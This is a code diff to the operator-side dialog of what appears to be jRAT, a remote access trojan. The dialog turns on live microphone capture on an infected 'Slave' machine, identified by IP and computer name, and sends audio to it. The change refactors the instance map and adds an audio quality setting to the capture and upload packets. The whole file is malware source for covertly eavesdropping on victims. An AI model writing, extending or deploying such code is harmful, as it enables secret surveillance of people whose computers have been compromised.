@@ -6,6 +6,7 @@ import java.awt.event.ActionListener;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.util.HashMap;
+import java.util.Map;
 
 import javax.swing.DefaultComboBoxModel;
 import javax.swing.GroupLayout;
@@ -19,7 +20,6 @@ import javax.swing.border.EmptyBorder;
 
 import se.jrat.common.SoundWriter;
 import se.jrat.controller.Slave;
-import se.jrat.controller.packets.incoming.Packet58ServerDownloadSoundCapture;
 import se.jrat.controller.packets.outgoing.Packet83ServerUploadSound;
 import se.jrat.controller.packets.outgoing.Packet84ToggleSoundCapture;
 import se.jrat.controller.utils.IconUtils;
@@ -28,13 +28,13 @@ import se.jrat.controller.utils.IconUtils;
 @SuppressWarnings({ "serial", "rawtypes", "unchecked" })
 public class DialogRemoteSoundCapture extends BaseDialog {
 
+	public static Map<Slave, DialogRemoteSoundCapture> INSTANCES = new HashMap<Slave, DialogRemoteSoundCapture>();
+
 	private JPanel contentPane;
 	private Slave slave;
 	private JButton btnStartListen;
 	private JButton btnStopListen;
-	public Packet58ServerDownloadSoundCapture packet;
 
-	public static HashMap<Slave, DialogRemoteSoundCapture> instances = new HashMap<Slave, DialogRemoteSoundCapture>();
 	private JComboBox comboBox;
 	private JButton btnStopRecord;
 	private JButton btnStartRecording;
@@ -49,8 +49,7 @@ public class DialogRemoteSoundCapture extends BaseDialog {
 		setResizable(false);
 		setIconImage(Toolkit.getDefaultToolkit().getImage(DialogRemoteSoundCapture.class.getResource("/icons/microphone.png")));
 		this.slave = sl;
-		packet = new Packet58ServerDownloadSoundCapture();
-		instances.put(slave, this);
+		INSTANCES.put(slave, this);
 		setTitle("Sound capture - " + sl.getIP() + " - " + sl.getComputerName());
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		setBounds(100, 100, 332, 114);
@@ -61,7 +60,7 @@ public class DialogRemoteSoundCapture extends BaseDialog {
 		btnStartListen = new JButton("Start Listening");
 		btnStartListen.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				slave.addToSendQueue(new Packet84ToggleSoundCapture(true));
+				slave.addToSendQueue(new Packet84ToggleSoundCapture(true, getQuality()));
 				btnStartListen.setEnabled(false);
 				btnStopListen.setEnabled(true);
 				comboBox.setEnabled(false);				
@@ -75,7 +74,7 @@ public class DialogRemoteSoundCapture extends BaseDialog {
 				btnStartListen.setEnabled(true);
 				btnStopListen.setEnabled(false);
 				comboBox.setEnabled(true);
-				slave.addToSendQueue(new Packet84ToggleSoundCapture(false));
+				slave.addToSendQueue(new Packet84ToggleSoundCapture(false, -1));
 			}
 		});
 		btnStopListen.setEnabled(false);
@@ -90,10 +89,10 @@ public class DialogRemoteSoundCapture extends BaseDialog {
 			public void actionPerformed(ActionEvent arg0) {
 				btnStartRecording.setEnabled(false);
 				btnStopRecord.setEnabled(true);
-				new Thread(new SoundWriter() {
+				new Thread(new SoundWriter(getQuality()) {
 					@Override
 					public void onRead(byte[] data, int read) throws Exception {
-						slave.addToSendQueue(new Packet83ServerUploadSound(data, read));	
+						slave.addToSendQueue(new Packet83ServerUploadSound(data, read, getQuality()));	
 					}
 				}).start();
 			}
@@ -104,7 +103,7 @@ public class DialogRemoteSoundCapture extends BaseDialog {
 			public void actionPerformed(ActionEvent e) {
 				btnStartRecording.setEnabled(true);
 				btnStopRecord.setEnabled(false);
-				SoundWriter.instance.running = false;
+				SoundWriter.instance.stop();
 			}
 		});
 		btnStopRecord.setEnabled(false);
@@ -153,7 +152,6 @@ public class DialogRemoteSoundCapture extends BaseDialog {
 	}
 
 	public void exit() {
-		instances.remove(slave);
-		packet.close();
+		INSTANCES.remove(slave);
 	}
 }
